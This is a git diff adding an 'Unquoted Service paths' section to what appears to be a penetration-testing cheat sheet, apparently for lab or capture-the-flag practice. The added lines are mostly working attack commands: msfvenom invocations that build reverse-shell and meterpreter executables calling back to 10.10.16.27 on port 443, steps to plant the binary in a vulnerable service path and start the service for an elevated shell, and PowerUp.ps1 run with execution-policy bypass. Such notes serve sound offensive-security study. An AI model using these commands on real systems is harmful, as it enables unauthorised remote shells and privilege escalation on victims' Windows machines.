@@ -480,4 +480,30 @@ net localgroup administrators
 ![image](https://github.com/user-attachments/assets/1b81fd8e-b084-4195-bd14-633c2e124b57)
 
 
+## Unquoted Service paths
+
+```shell
+# run powerup.ps1 and look for "Checking for unqouted service paths"
+# create a payload (meterpreter or regular)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.27 LPORT=443 -f exe > Common.exe # listen with netcat
+msfvenom -p windows/meterpreter/shell_reverse_tcp LHOST=10.10.16.27 LPORT=443 -f exe > Common.exe # listen with multi handler msfconsole
+
+# save the file in the right location in this example at
+C:\Program Files\Unqouted Path Service\
+
+# Manually start the service
+sc start unqoutedservice
+
+# Elevated shell
+
+```
+
+powerup.ps1
+```shell
+powershell -ep bypass
+# if we add Invoke-AllChecks to the end of the file we can directly run it in the the victim shell
+powershell -ep bypass .\powerup.ps1
+```
+
+![image](https://github.com/user-attachments/assets/26e043cc-57d3-43d5-800a-a5277aeba107)
 
